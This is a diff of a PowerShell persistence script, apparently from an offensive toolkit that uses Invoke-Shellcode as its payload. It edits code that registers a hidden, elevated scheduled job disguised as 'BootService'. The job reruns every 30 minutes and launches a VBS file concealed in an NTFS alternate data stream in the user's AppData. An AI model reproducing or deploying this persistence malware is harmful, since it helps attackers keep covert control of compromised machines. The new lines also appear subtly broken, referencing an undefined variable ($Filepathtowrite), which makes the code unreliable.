@@ -95,8 +95,10 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     else {
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
        $Trig = New-JobTrigger -Once -At "7:00 AM" -RepeatIndefinitely -RepetitionInterval "00:30:00"
-       $Script = "wscript.exe $env:USERPROFILE\AppData:$vbsFile"
-       Register-ScheduledJob -Name BootService -ScriptBlock [scriptblock]::Create($Script) -Trigger $Trig -ScheduledJobOption $Option -RunNow
+       $Filepath = "$env:USERPROFILE\AppData:$vbsFile"
+       $Script = {wscript.exe $Filepathtowrite}
+       
+       Register-ScheduledJob -Name BootService -ScriptBlock $Script -ArgumentList $Filepath -Trigger $Trig -ScheduledJobOption $Option -RunNow
 
        "Process Complete."
     }
